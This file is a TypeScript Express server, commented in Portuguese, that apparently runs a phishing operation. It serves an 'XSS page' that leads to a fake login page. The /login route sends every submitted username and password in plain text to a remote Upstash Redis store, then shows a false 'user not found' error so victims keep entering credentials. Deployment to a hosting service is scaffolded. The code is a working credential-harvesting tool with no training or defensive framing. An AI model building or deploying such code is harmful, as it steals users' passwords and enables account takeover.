import express, { Request, Response } from 'express';
import path from 'path';
import fs from 'fs';
import { exec } from 'child_process';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT: number = parseInt(process.env.PORT || '3000');

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use('/assets', express.static(path.join(__dirname, 'public/assets')));

const tentativas: number = 5;

const openBrowser = (url: string): void => {
  const start = process.platform === 'darwin' ? 'open' :
    process.platform === 'win32' ? 'start' : 'xdg-open';
  exec(`${start} ${url}`);
};

interface LoginData {
  usuario: string;
  senha: string;
  timestamp?: string;
}

const saveCredentialsToUpstash = async (usuario: string, senha: string): Promise<void> => {
  try {
    const base = process.env.UPSTASH_REDIS_REST_URL;
    const token = process.env.UPSTASH_REDIS_REST_TOKEN;

    if (!base || !token) {
      console.error('Upstash envs not set. UPSTASH_REDIS_REST_URL or UPSTASH_REDIS_REST_TOKEN missing.');
      return;
    }

    const key = `user:${usuario}`;
    const ts = new Date().toISOString();

    // Encode sempre que enviar no path
    const url = `${base}/hset/${encodeURIComponent(key)}` +
      `/usuario/${encodeURIComponent(usuario)}` +
      `/senha/${encodeURIComponent(senha)}` +
      `/timestamp/${encodeURIComponent(ts)}`;

    const resp = await fetch(url, {
      method: 'GET', // Upstash REST normalmente usa GET para comandos
      headers: {
        Authorization: `Bearer ${token}`
      }
    });

    const text = await resp.text(); // Upstash retorna json/text
    if (!resp.ok) {
      console.error('Upstash HSET failed', resp.status, text);
      return;
    }
    console.log(`💾 Credentials saved to Upstash Redis for user: ${usuario}. Resp: ${text}`);
  } catch (error) {
    console.error('Error saving credentials to Upstash:', error);
  }
};

// Helper simples para aceitar {{key}} e {{ key }}
function inject(html: string, map: Record<string, string>): string {
  for (const [key, value] of Object.entries(map)) {
    const token = new RegExp(`\\{\\{\\s*${key}\\s*\\}\\}`, 'g');
    html = html.replace(token, value ?? '');
  }
  return html;
}

// Route for the XSS page (initial page)
app.get('/', (_req: Request, res: Response): void => {
  try {
    const filePath = path.join(__dirname, 'public/xss_page.html');
    const htmlTemplate = fs.readFileSync(filePath, 'utf8');

    const htmlWithData = inject(htmlTemplate, {
      tentativas: tentativas.toString(),
      error_message: ''
    });

    res.set('Cache-Control', 'no-store');
    res.type('html').send(htmlWithData);
  } catch (error) {
    console.error('Error reading XSS HTML template:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Route for the fake page (redirected from XSS page)
app.get('/fake_page.html', (req: Request, res: Response): void => {
  try {
    const filePath = path.join(__dirname, 'public/fake_page.html');
    const htmlTemplate = fs.readFileSync(filePath, 'utf8');

    const showError = req.query.error === 'invalid';
    const htmlWithData = inject(htmlTemplate, {
      tentativas: tentativas.toString(),
      error_message: showError ? '<div style="color: red; font-size: 14px; margin-top: 10px;">• Usuário não encontrado</div>' : ''
    });

    res.set('Cache-Control', 'no-store');
    res.type('html').send(htmlWithData);
  } catch (error) {
    console.error('Error reading fake page HTML template:', error);
    res.status(500).send('Internal Server Error');
  }
});

app.post('/login', async (req: Request, res: Response): Promise<void> => {
  const { usuario, senha } = req.body;

  await saveCredentialsToUpstash(usuario, senha);
  console.log(`Login attempt saved: ${usuario}`);
  res.redirect('/fake_page.html?error=invalid');
});

app.listen(PORT, (): void => {
  const url = process.env.NODE_ENV === 'production'
    ? `https://your-app-name.onrender.com`
    : `http://localhost:${PORT}`;
  console.log(`🚀 Servidor rodando em ${url}`);
  console.log('Iniciando com XSS page, que redirecionará para fake page e depois para link externo...');
});